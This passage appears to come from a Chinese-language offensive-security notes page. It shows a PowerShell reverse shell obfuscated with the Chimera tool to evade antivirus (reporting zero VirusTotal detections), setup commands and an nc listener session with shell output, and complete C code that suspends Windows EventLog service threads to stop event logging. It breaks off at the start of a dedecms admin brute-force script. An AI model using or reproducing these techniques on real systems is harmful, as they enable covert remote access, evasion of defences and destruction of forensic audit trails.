class=\"token punctuation\">]</span>::ASCII<span class=\"token punctuation\">)</span>.GetBytes<span class=\"token punctuation\">(</span><span class=\"token string\">\"Windows PowerShell running as user \"</span> + <span class=\"token variable\">$env</span>:username + <span class=\"token string\">\" on \"</span> + <span class=\"token variable\">$env</span>:computername + \"<span class=\"token variable\"><span class=\"token variable\">`</span>nCopyright <span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span> <span class=\"token number\">2015</span> Microsoft Corporation. All rights reserved.<span class=\"token variable\">`</span></span>n`n\"<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$stream</span>.Write<span class=\"token punctuation\">(</span><span class=\"token variable\">$sendbytes</span>,0,<span class=\"token variable\">$sendbytes</span>.Length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#Show an interactive PowerShell prompt</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$sendbytes</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>text.encoding<span class=\"token punctuation\">]</span>::ASCII<span class=\"token punctuation\">)</span>.GetBytes<span class=\"token punctuation\">(</span><span class=\"token string\">'PS '</span> + <span class=\"token punctuation\">(</span>Get-Location<span class=\"token punctuation\">)</span>.Path + <span class=\"token string\">'>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$stream</span>.Write<span class=\"token punctuation\">(</span><span class=\"token variable\">$sendbytes</span>,0,<span class=\"token variable\">$sendbytes</span>.Length<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"813.png\" alt=\"\" /></p>\n<pre><code>经过Chimera处理后\n</code></pre>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># Watched anxiously by the Rebel command, the fleet of small, single-pilot fighters speeds toward the massive, impregnable Death Star.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>              <span class=\"token variable\">$xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$jYODNAbvrcYMGaAnZHZwE</span><span class=\"token builtin class-name\">.</span><span class=\"token string\">\"<span class=\"token variable\">$bnyEOfzNcZkkuogkqgKbfmmkvB</span><span class=\"token variable\">$ZSshncYvoHKvlKTEanAhJkpKSIxQKkTZJBEahFz</span><span class=\"token variable\">$KKApRDtjBkYfJhiVUDOlRxLHmOTOraapTALS</span>\"</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>       <span class=\"token comment\"># As the station slowly moves into position to obliterate the Rebels, the pilots maneuver down a narrow trench along the station’s equator, where the thermal port lies hidden.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>          <span class=\"token punctuation\">[</span>bYte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token variable\">$mOmMDiAfdJwklSzJCUFzcUmjONtNWN</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">..</span><span class=\"token number\">65535</span><span class=\"token operator\">|</span>%<span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token comment\"># Darth Vader leads the counterattack himself and destroys many of the Rebels, including Luke’s boyhood friend Biggs, in ship-to-ship combat.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\"># Finally, it is up to Luke himself to make a run at the target, and he is saved from Vader at the last minute by Han Solo, who returns in the nick of time and sends Vader spinning away from the station.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>           <span class=\"token comment\"># Heeding Ben’s disembodied voice, Luke switches off his computer and uses the Force to guide his aim.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token comment\"># Against all odds, Luke succeeds and destroys the Death Star, dealing a major defeat to the Empire and setting himself on the path to becoming a Jedi Knight.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>           <span class=\"token variable\">$PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>teXt.enCoDInG<span class=\"token punctuation\">]</span>::AsCII<span class=\"token punctuation\">)</span>.<span class=\"token string\">\"<span class=\"token variable\">$mbKdotKJjMWJhAignlHUS</span><span class=\"token variable\">$GhPYzrThsgZeBPkkxVKpfNvFPXaYNqOLBm</span>\"</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WInDows Powershell rUnnInG As User \"</span> + <span class=\"token variable\">$TgDXkBADxbzEsKLWOwPoF</span>:UsernAMe + <span class=\"token string\">\" on \"</span> + <span class=\"token variable\">$TgDXkBADxbzEsKLWOwPoF</span>:CoMPUternAMe + \"<span class=\"token variable\"><span class=\"token variable\">`</span>nCoPYrIGht <span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span> <span class=\"token number\">2015</span> MICrosoft CorPorAtIon. All rIGhts reserveD.<span class=\"token variable\">`</span></span>n`n\"<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># Far off in a distant galaxy, the starship belonging to Princess Leia, a young member of the Imperial Senate, is intercepted in the course of a secret mission by a massive Imperial Star Destroyer.</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov</span>.WrIte<span class=\"token punctuation\">(</span><span class=\"token variable\">$PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK</span>,0,<span class=\"token variable\">$PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK</span>.LenGth<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token comment\"># An imperial boarding party blasts its way onto the captured vessel, and after a fierce firefight the crew of Leia’s ship is subdued.</span></pre></td></tr></table></figure><pre><code>VirusTotal报告检测到0个\n</code></pre>\n<p><img data-src=\"814.png\" alt=\"\" /></p>\n<pre><code>Kali下安装\nsudo apt-get update &amp;&amp; sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git\nsudo git clone https://github.com/tokyoneon/chimera /opt/chimera\nsudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/\nsudo chmod +x chimera.sh; ./chimera.sh --help\n在shells /目录中有几个Nishang脚本和一些通用脚本。所有都已经过测试\n使用脚本之前，请将硬编码的IP地址（192.168.56.101）更改为您的Kali地址。\n/opt/chimera$ sed -i 's/192.168.56.101/&lt;YOUR-IP-ADDRESS&gt;/g' shells/*.ps1\n所有脚本的默认端口为4444。如果需要，再次使用sed进行更改。\n/opt/chimera$ sed -i 's/4444/&lt;YOUR-DESIRED-PORT&gt;/g' shells/*.ps1\nf：输入文件。\n-o：输出文件。\n-g：从脚本中省略几个Nishang特定的特征。\n-v：替换变量名称。\n-t：替换数据类型。\n-j：替代函数名称。\n-i：在每一行中插入任意注释。\n-c：用任意数据替换注释。\n-h：将IP地址转换为十六进制格式。\n-s：替换各种字符串。\n-b：在可能的情况下反引号字符串。\n-e：过程完成后，检查混淆文件。\n举例，nc反弹shell\nnc -v -l -p 4444\n把混淆好的脚本传入目标\nPS&gt; powershell.exe -ep bypass C:\\path\\to\\chimera.ps1\n获得shell\nnc -v -l -p 4444\n\nlistening on [any] 4444 ...\n192.168.56.105: inverse host lookup failed: Host name lookup failure\nconnect to [192.168.56.107] from (UNKNOWN) [192.168.56.105] 49725\nWindows PowerShell running as user  on\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\target&gt;\n一些使用说明\nhttps://github.com/tokyoneon/Chimera/blob/master/USAGE.md\n</code></pre>\n<h2 id=\"通过挂起eventlog服务线程禁用windows事件日志\"><a class=\"anchor\" href=\"#通过挂起eventlog服务线程禁用windows事件日志\">#</a> 通过挂起 EventLog 服务线程禁用 Windows 事件日志</h2>\n<pre><code>Windows事件日志由svchost.exe托管处理。EventLog\n如果我们列出svchost进程，则会看到许多这样的进程：\n</code></pre>\n<p><img data-src=\"815.png\" alt=\"\" /></p>\n<pre><code>从上面的屏幕截图中，尚不清楚哪个进程真正托管了该服务，但是如果我们继续在Process Hacker中逐个检查进程，我们最终将找到托管该服务的进程，当前为pid 2196：EventLog svchost.exe\n</code></pre>\n<p><img data-src=\"816.png\" alt=\"\" /></p>\n<pre><code>通过以下命令获得eventlog的进程ID\nGet-WmiObject -Class win32_service -Filter &quot;name = 'eventlog'&quot; | select -exp ProcessId\n</code></pre>\n<p><img data-src=\"817.png\" alt=\"\" /></p>\n<pre><code>如果我们查看的svchost.exe线程，则会看到\n</code></pre>\n<p><img data-src=\"818.png\" alt=\"\" /></p>\n<pre><code>下面显示的是，确实，暂停足以使EventLog服务无法注册任何新事件：\n没有挂起时修改个密码\n</code></pre>\n<p><img data-src=\"819.png\" alt=\"\" /></p>\n<pre><code>会注册新的事件\n挂起时则没有新的事件\n</code></pre>\n<p><img data-src=\"820.png\" alt=\"\" /></p>\n<pre><code>代码实现\n下面是在较高级别下工作的技术代码：\n1.使用OpenSCManagerA命令打开服务控制管理器的句柄 \n2.使用OpenServiceA命令打开EventLog服务的句柄 \n3.使用QueryServiceStatusEx命令检索svchost.exe（托管EventLog）进程ID\n4.打开svchost.exe进程的句柄（从第3步开始）\n5.获取由svchost.exe加载的已加载模块的列表 EnumProcessModules\n6.循环浏览在步骤5中检索到的已加载模块列表，使用查找其名称并找到模块的基地址-这是包含服务内部工作的模块\n7.获取模块信息。它将返回带有模块的起始地址-我们稍后将在确定服务线程是否落入wevtsvc.dll模块的内存空间时需要这些详细信息wevtsvc.dll   GetModuleInformation EventLog\n8.枚举svchost.exe内的所有线程。Thread32FirstThread32Next\n9.对于步骤8中的每个线程，使用NtQueryInformationThread命令检索线程的起始地址 \n10.对于步骤8中的每个线程，检查线程的起始地址是否属于svchost.exe内部的内存空间。wevtsvc.dll\n11.如果线程的起始地址在内存空间内，则这是我们的目标线程，我们将其挂起wevtsvc.dll SuspendThread\n12.EventLog 服务现已禁用\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Psapi.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;TlHelp32.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;dbghelp.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;winternl.h></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">comment</span><span class=\"token punctuation\">(</span>lib<span class=\"token punctuation\">,</span> </span><span class=\"token string\">\"DbgHelp\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>using myNtQueryInformationThread <span class=\"token operator\">=</span> <span class=\"token function\">NTSTATUS</span><span class=\"token punctuation\">(</span>NTAPI<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>IN HANDLE ThreadHandle<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>IN THREADINFOCLASS ThreadInformationClass<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>OUT PVOID ThreadInformation<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>IN ULONG ThreadInformationLength<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>OUT PULONG ReturnLength</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>HANDLE serviceProcessHandle<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>HANDLE snapshotHandle<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>HANDLE threadHandle<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>HMODULE modules<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>SIZE_T modulesSize <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>modules<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>DWORD modulesSizeNeeded <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>DWORD moduleNameSize <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>SIZE_T modulesCount <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>WCHAR remoteModuleName<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>HMODULE serviceModule <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>MODULEINFO serviceModuleInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>DWORD_PTR threadStartAddress <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>DWORD bytesNeeded <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>myNtQueryInformationThread NtQueryInformationThread <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>myNtQueryInformationThread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token function\">GetProcAddress</span><span class=\"token punctuation\">(</span><span class=\"token function\">GetModuleHandleA</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ntdll\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"NtQueryInformationThread\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>THREADENTRY32 threadEntry<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>threadEntry<span class=\"token punctuation\">.</span>dwSize <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>THREADENTRY32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>SC_HANDLE sc <span class=\"token operator\">=</span> <span class=\"token function\">OpenSCManagerA</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> MAXIMUM_ALLOWED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>SC_HANDLE service <span class=\"token operator\">=</span> <span class=\"token function\">OpenServiceA</span><span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">,</span> <span class=\"token string\">\"EventLog\"</span><span class=\"token punctuation\">,</span> MAXIMUM_ALLOWED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>SERVICE_STATUS_PROCESS serviceStatusProcess <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token expression\">Get PID of svchost<span class=\"token punctuation\">.</span>exe that hosts EventLog service</span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token function\">QueryServiceStatusEx</span><span class=\"token punctuation\">(</span>service<span class=\"token punctuation\">,</span> SC_STATUS_PROCESS_INFO<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPBYTE<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>serviceStatusProcess<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>serviceStatusProcess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>bytesNeeded<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>DWORD servicePID <span class=\"token operator\">=</span> serviceStatusProcess<span class=\"token punctuation\">.</span>dwProcessId<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token expression\">Open handle to the svchost<span class=\"token punctuation\">.</span>exe</span></span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>serviceProcessHandle <span class=\"token operator\">=</span> <span class=\"token function\">OpenProcess</span><span class=\"token punctuation\">(</span>MAXIMUM_ALLOWED<span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">,</span> servicePID<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>snapshotHandle <span class=\"token operator\">=</span> <span class=\"token function\">CreateToolhelp32Snapshot</span><span class=\"token punctuation\">(</span>TH32CS_SNAPTHREAD<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token expression\">Get a list of modules loaded by svchost<span class=\"token punctuation\">.</span>exe</span></span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token function\">EnumProcessModules</span><span class=\"token punctuation\">(</span>serviceProcessHandle<span class=\"token punctuation\">,</span> modules<span class=\"token punctuation\">,</span> modulesSize<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>modulesSizeNeeded<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>modulesCount <span class=\"token operator\">=</span> modulesSizeNeeded <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>HMODULE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> modulesCount<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>serviceModule <span class=\"token operator\">=</span> modules<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token expression\">Get loaded module's name</span></span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token function\">GetModuleBaseName</span><span class=\"token punctuation\">(</span>serviceProcessHandle<span class=\"token punctuation\">,</span> serviceModule<span class=\"token punctuation\">,</span> remoteModuleName<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>remoteModuleName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">wcscmp</span><span class=\"token punctuation\">(</span>remoteModuleName<span class=\"token punctuation\">,</span> L<span class=\"token string\">\"wevtsvc.dll\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Windows EventLog module %S at %p\\n\\n\"</span><span class=\"token punctuation\">,</span> remoteModuleName<span class=\"token punctuation\">,</span> serviceModule<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token function\">GetModuleInformation</span><span class=\"token punctuation\">(</span>serviceProcessHandle<span class=\"token punctuation\">,</span> serviceModule<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>serviceModuleInfo<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>MODULEINFO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token expression\">Enumerate threads</span></span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token function\">Thread32First</span><span class=\"token punctuation\">(</span>snapshotHandle<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>threadEntry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">Thread32Next</span><span class=\"token punctuation\">(</span>snapshotHandle<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>threadEntry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>threadEntry<span class=\"token punctuation\">.</span>th32OwnerProcessID <span class=\"token operator\">==</span> servicePID<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>threadHandle <span class=\"token operator\">=</span> <span class=\"token function\">OpenThread</span><span class=\"token punctuation\">(</span>MAXIMUM_ALLOWED<span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">,</span> threadEntry<span class=\"token punctuation\">.</span>th32ThreadID<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token function\">NtQueryInformationThread</span><span class=\"token punctuation\">(</span>threadHandle<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>THREADINFOCLASS<span class=\"token punctuation\">)</span><span class=\"token number\">0x9</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>threadStartAddress<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>DWORD_PTR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token expression\">Check <span class=\"token keyword\">if</span> thread's start address is inside wevtsvc<span class=\"token punctuation\">.</span>dll memory range</span></span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>threadStartAddress <span class=\"token operator\">>=</span> <span class=\"token punctuation\">(</span>DWORD_PTR<span class=\"token punctuation\">)</span>serviceModuleInfo<span class=\"token punctuation\">.</span>lpBaseOfDll <span class=\"token operator\">&amp;&amp;</span> threadStartAddress <span class=\"token operator\">&lt;=</span> <span class=\"token punctuation\">(</span>DWORD_PTR<span class=\"token punctuation\">)</span>serviceModuleInfo<span class=\"token punctuation\">.</span>lpBaseOfDll <span class=\"token operator\">+</span> serviceModuleInfo<span class=\"token punctuation\">.</span>SizeOfImage<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Suspending EventLog thread %d with start address %p\\n\"</span><span class=\"token punctuation\">,</span> threadEntry<span class=\"token punctuation\">.</span>th32ThreadID<span class=\"token punctuation\">,</span> threadStartAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token expression\">Suspend EventLog service thread</span></span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token function\">SuspendThread</span><span class=\"token punctuation\">(</span>threadHandle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>以下演示\nnet user ola ola执行并更改用户的ola密码，并在6:55:30 PM记录事件4724\n</code></pre>\n<p><img data-src=\"821.png\" alt=\"\" /><br />\n<img data-src=\"822.png\" alt=\"\" /></p>\n<pre><code>执行文件，svchost.exe中暂停了4个EventLog线程\n</code></pre>\n<p><img data-src=\"823.png\" alt=\"\" /><br />\n<img data-src=\"824.png\" alt=\"\" /></p>\n<pre><code>再次执行修改密码命令\n</code></pre>\n<p><img data-src=\"825.png\" alt=\"\" /><br />\n<img data-src=\"826.png\" alt=\"\" /></p>\n<pre><code>新的事件没有写入，只有挂起前的事件\n</code></pre>\n<p><img data-src=\"827.png\" alt=\"\" /></p>\n<h2 id=\"dedecms\"><a class=\"anchor\" href=\"#dedecms\">#</a> dedecms</h2>\n<h3 id=\"爆破后台\"><a class=\"anchor\" href=\"#爆破后台\">#</a> 爆破后台</h3>\n<pre><code>windows服务器\ntags.php\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token 